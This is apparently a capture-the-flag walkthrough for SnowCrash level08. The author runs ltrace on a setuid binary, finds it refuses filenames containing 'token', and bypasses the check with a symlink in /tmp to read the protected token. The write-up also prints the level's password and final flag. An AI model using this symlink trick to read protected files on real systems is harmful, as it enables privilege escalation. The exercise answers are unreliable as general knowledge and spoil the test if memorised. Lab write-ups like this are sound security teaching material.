## level08
I was greeted by 2 files, here are the enumeration results
```
level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$ file token
token: regular file, no read permission
level08@SnowCrash:~$ file level08
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
level08@SnowCrash:~$ la -lah
total 28K
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3.5K Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8.5K Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

Upon running the program with ltrace, here are the results
```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 /dev/shm/token
__libc_start_main(0x8048554, 2, 0xbffff7c4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/dev/shm/token", "token")                                         = "token"
printf("You may not access '%s'\n", "/dev/shm/token"You may not access '/dev/shm/token'
)                     = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```

Im guessing it uses `strstr` to check the name of the file if it contains the string `token` and if it is, it will just print the error message. Other files are okay as seen below :

```
level08@SnowCrash:~$ ltrace ./level08 /dev/shm/test
__libc_start_main(0x8048554, 2, 0xbffff7c4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/dev/shm/test", "token")                                          = NULL
open("/dev/shm/test", 0, 014435162522)                                    = 3
read(3, "sadf\n", 1024)                                                   = 5
write(1, "sadf\n", 5sadf
)                                                     = 5
+++ exited (status 5) +++
level08@SnowCrash:~$
```

My intuition tells me to make a soft link to that file with a different name, and call the program with the soft link. It didnt work however

```
level08@SnowCrash:~$ ln -s token /dev/shm/lala
level08@SnowCrash:~$ ./level08 /dev/shm/lala
level08: Unable to open /dev/shm/lala: Permission denied
level08@SnowCrash:~$ file /dev/shm/lala
/dev/shm/lala: broken symbolic link to `token'
level08@SnowCrash:~$ cat /dev/shm/lala
cat: /dev/shm/lala: No such file or directory
```

I also noticed that the program does not do any setuid calls before calling open.

After some searcing, I found out that for [sticky world writable directories like /run/shm](https://www.baeldung.com/linux/symlinks-permissions), symlinks can only be followed by who created it. So I made the symlink in some other location and it worked

The password to `flag08` is `quif5eloekouj29ke0vouxean`
```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/test &&  ./level08 /tmp/test
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```

The flag of this level is `25749xKZ8L7DkSCwJkT9dyv6f`

```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```